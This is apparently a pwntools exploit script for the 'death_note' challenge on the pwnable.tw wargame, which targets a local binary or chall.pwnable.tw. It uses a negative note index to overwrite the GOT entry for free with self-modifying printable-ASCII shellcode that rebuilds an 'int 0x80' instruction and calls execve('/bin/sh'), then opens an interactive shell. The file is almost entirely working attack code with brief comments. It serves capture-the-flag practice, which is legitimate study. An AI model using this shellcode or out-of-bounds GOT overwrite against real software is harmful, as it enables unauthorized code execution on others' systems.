#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./death_note"
elf=ELF(pwn_file)
libc=ELF("/lib/i386-linux-gnu/libc-2.23.so")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10201)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add(index, data):
    r.sendafter("choice :", '1')
    r.sendafter("Index :", str(index))
    r.sendlineafter("Name :", data)

def show(index):
    r.sendafter("choice :", '2')
    r.sendafter("Index :", str(index))

def dele(index):
    r.sendafter("choice :", '3')
    r.sendafter("Index :", str(index))

pool = 0x0804A060

debug()

# 212d - 5030*2 = 80cd

# change last bytes \x2d\x21 to \x80\xcd ( "int 0x80" )
# change eax to 0xb
# change ebx to pool[0]

sh = """
    push eax
    and eax, 0x21212121
    and eax, 0x5e5e5e5e
    sub eax, 0x7e7e6e7e
    sub eax, 0x30302030
    sub eax, 0x51512122
    push eax
    pop edi

    pop eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax
    dec eax

    sub [eax], di
    sub [eax], di

    pop ebx
    pop ebx
    and eax, 0x21212121
    and eax, 0x5e5e5e5e
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
"""


sh = asm(sh)+"\x2d\x21"

add(-19, sh)                # change ['free'] to ['execve']
add(0, "/bin/sh\x00")       
dele(0)                     # execve("/bin/sh")

r.interactive()
